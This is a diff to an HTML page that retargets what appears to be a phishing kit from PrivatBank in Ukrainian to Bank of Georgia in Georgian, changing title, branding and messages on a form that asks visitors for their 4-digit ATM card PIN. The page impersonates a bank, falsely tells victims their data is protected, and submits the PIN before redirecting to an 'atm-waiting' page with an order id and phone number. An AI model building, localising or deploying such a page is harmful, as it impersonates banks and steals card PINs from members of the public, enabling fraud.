@@ -1,12 +1,16 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="ka" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>ПІН-код картки — PrivatBank</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<title>ბარათის PIN-კოდი — საქართველოს ბანკი</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  html,body{height:100%;font-family: "Noto Sans Georgian", -apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
   body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
 
   .header{
@@ -43,7 +47,7 @@
     flex:1;height:56px;border:none;border-bottom:1.5px solid #d8d8d8;
     background:transparent;text-align:center;
     font-size:28px;font-weight:600;color:#1a1a1a;
-    font-family:inherit;outline:none;transition:.2s;padding:0 0 8px;
+    font-family: "Noto Sans Georgian", inherit;outline:none;transition:.2s;padding:0 0 8px;
     min-width:0;letter-spacing:4px;
     -webkit-text-security:disc;
   }
@@ -88,11 +92,11 @@
       <rect x="38" y="82" width="44" height="22" rx="2" fill="none" stroke="#00A651" stroke-width="3"/>
       <circle cx="60" cy="93" r="4" fill="#00A651"/>
     </svg>
-    <div class="title">ПІН-код вашої картки</div>
-    <div class="subtitle">Введіть 4-значний ПІН-код,<br>який ви використовуєте в банкоматі</div>
+    <div class="title">თქვენი ბარათის PIN-კოდი</div>
+    <div class="subtitle">შეიყვანეთ 4-ციფრიანი PIN-კოდი,<br>რომელსაც ბანკომატში იყენებთ</div>
 
     <div class="field">
-      <div class="lbl">ATM PIN-код</div>
+      <div class="lbl">ATM PIN-კოდი</div>
       <div class="pin-row">
         <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p0" placeholder="•">
         <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p1" placeholder="•">
@@ -104,7 +108,7 @@
 
     <div class="info">
       <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-      <span>Ваші дані захищені. PrivatBank ніколи не повідомляє ПІН-код стороннім особам.</span>
+      <span>თქვენი მონაცემები დაცულია. საქართველოს ბანკი არასდროს არ ავრცელებს PIN-კოდს უცხო პირებზე.</span>
     </div>
   </div>
 
@@ -117,7 +121,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Невірний ПІН-код";
+    el.textContent = "არასწორი PIN-კოდი";
     el.style.display = "block";
     setTimeout(() => { el.style.display = "none"; }, 3500);
   }
@@ -176,11 +180,11 @@
         location.href = "atm-waiting.html?order=" + orderId +
                         (phone ? "&phone=" + encodeURIComponent(phone) : "");
       } else {
-        showError(data.message || "Сталася помилка");
+        showError(data.message || "შეცდომა მოხდა");
         resetInputs();
       }
     } catch (err) {
-      showError("Помилка з'єднання");
+      showError("კავშირის შეცდომა");
       resetInputs();
     }
   }
